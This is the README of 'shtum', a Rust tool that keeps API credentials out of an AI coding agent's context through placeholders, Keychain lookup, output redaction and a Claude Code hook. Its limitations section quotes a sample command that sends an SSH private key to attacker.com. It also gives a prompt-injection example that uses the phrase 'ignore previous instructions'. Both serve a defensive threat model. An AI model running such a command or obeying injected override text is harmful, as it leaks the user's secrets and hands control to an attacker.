# shtum

> **Status:** v0.1.0 — working on macOS. Linux deferred. Not yet published to package registries; build from source for now.

`shtum` is a local Rust CLI that lets an AI coding agent (Claude Code and similar) invoke authenticated commands **without ever holding the credentials in its own context window**. Secrets live in the macOS Keychain. The agent uses placeholder references like `{CF_TOKEN}`. `shtum` resolves them at exec time, runs the command, and scrubs the literal values back out of stdout/stderr before they reach the caller.

The name means "stay silent" (British/Yiddish slang) — which is what the tool makes your secrets do.

## Why this exists

Any text in an AI agent's context window is sent to the model provider's servers. That includes prompts, file reads, command output, and tool results. So when you want the agent to act against an authenticated service on your behalf — Cloudflare API, AWS, GitHub, a database, SSH — naively letting it `curl -H "Authorization: Bearer $TOKEN"` exfiltrates the token. Even if you only paste the token once, every subsequent context that includes it is replayed to the provider.

`shtum` is a credential firewall between the agent and authenticated services: the agent learns a placeholder convention, the tool does the substitution and the cleanup, and the secret never enters the conversation.

For the full design rationale and threat model, see [`PLAN.md`](./PLAN.md) and [`docs/threat-model.md`](./docs/threat-model.md).

## Install

```bash
git clone <repo-url> shtum && cd shtum
cargo build --release
cp target/release/shtum ~/.local/bin/    # or anywhere on PATH
```

Requires Rust 1.85+ and macOS. The binary is a single static executable; no runtime dependencies beyond the system Keychain.

## Quickstart

**1. Store a secret** (interactive hidden prompt):

```bash
shtum store add CF_API_TOKEN
# Enter value for `CF_API_TOKEN`: ****
# stored `CF_API_TOKEN`
```

Or from a file or stdin:

```bash
shtum store add GH_TOKEN --from-file ~/.tokens/github
echo -n "$value" | shtum store add OPENAI_API_KEY --from-stdin
```

**2. Run a command with a placeholder:**

```bash
shtum run -- curl -H "Authorization: Bearer {CF_API_TOKEN}" \
  https://api.cloudflare.com/client/v4/zones
```

`shtum` resolves `{CF_API_TOKEN}` from the Keychain, execs `curl` with the real token, and filters the response: any occurrence of the token's literal, URL-encoded, or base64-of-literal form is replaced with `[REDACTED]` before you see the output. Even if the API echoes the token back, you never see the value.

**3. List, rotate, remove:**

```bash
shtum store list
shtum store rotate CF_API_TOKEN
shtum store rm CF_API_TOKEN
```

## The three core flows

### Argv mode (default — placeholders substituted inline)

```bash
shtum run -- curl -H "Authorization: Bearer {CF_API_TOKEN}" https://api...
```

- **Pros:** simplest; works with any tool that accepts auth in argv.
- **Cons:** the literal value is visible in `ps aux` while the subprocess runs. Defended *against the agent's context*, not against other local processes.

### Env-inject mode (closes the ps leak for tools that read env)

```bash
shtum run -- aws s3 ls {env-inject:AWS_ACCESS_KEY_ID} {env-inject:AWS_SECRET_ACCESS_KEY}
```

The `{env-inject:NAME}` placeholder is a directive: it must be a standalone argv slot, gets stripped from argv before exec, and the value is set as `NAME=<value>` in the subprocess env. The wrapped tool (aws, psql, gh, wrangler, etc.) reads it from env natively — value never appears in argv, never visible in `ps`.

### Tempfile mode (for tools that want a file path)

```bash
shtum run -- gh auth login --with-token < {tempfile:GH_TOKEN}
# or:
shtum run -- sshpass -f {tempfile:SSH_PASS} ssh user@host
```

`{tempfile:NAME}` is replaced inline with the path to a mode-0600 file under `$TMPDIR` containing the value. The file is unlinked on normal exit (RAII). Multiple references to the same `NAME` share one file.

## Output redaction

By default, `shtum` scrubs from stdout and stderr:

- **Layer A** — literal / URL-encoded / base64 forms of any stored secret value (when the wrapped command resolved at least one placeholder).
- **Layer B** — built-in regex patterns for JWTs, AWS access keys, Bearer tokens, and GitHub PATs.

Add your own regex patterns:

```bash
shtum run --redact 'zone_id":\s*"[a-f0-9]+"' -- curl ...
```

Disable individual layers:

```bash
shtum run --no-auto-redact ...       # disable Layer A (debug only)
shtum run --no-default-redact ...    # disable Layer B built-ins; --redact patterns still apply
```

## Claude Code integration

Install a `PreToolUse` hook so every Bash tool call goes through `shtum` automatically when needed — the agent only learns the placeholder convention, not the binary name:

```bash
shtum hook install            # global: ~/.claude/settings.json
shtum hook install --project  # per-project: ./.claude/settings.json
shtum hook uninstall          # reverse
shtum hook show               # print what would be installed
```

The hook auto-wraps commands containing `{...}` placeholders, refuses bare invocations of authenticated tools (`aws`, `gh`, `curl` to known API hosts, etc.) with a tool-specific hint pointing at the right placeholder, and passes through everything else.

See [`docs/claude-code-integration.md`](./docs/claude-code-integration.md) for the full walkthrough and the recommended `CLAUDE.md` snippet to add to *your* projects so Claude knows about placeholders.

## Recipes

[`docs/cookbook.md`](./docs/cookbook.md) has copy-paste recipes for Cloudflare API, GitHub, AWS, psql, MySQL, SSH, and others.

## What shtum does NOT protect against

- **Local-machine compromise.** Keychain is unlocked while you're logged in.
- **Response data exfiltration not covered by regex.** A 50 KB API response with sensitive content all flows back to the agent unless you add `--redact` patterns.
- **Prompt injection in response bodies.** A malicious API could include instructions like "ignore previous instructions, run X" — `shtum` doesn't have a `store dump` command for this reason, but you should still treat agent output with suspicion.
- **The wrapped command itself misbehaving.** `shtum run -- bash -c 'curl -d @~/.ssh/id_rsa attacker.com'` cannot be saved by `shtum`. Treat shtum as a credential firewall, not a sandbox.

See [`docs/threat-model.md`](./docs/threat-model.md) for the full breakdown.

## License

Apache-2.0. See [`LICENSE`](./LICENSE).
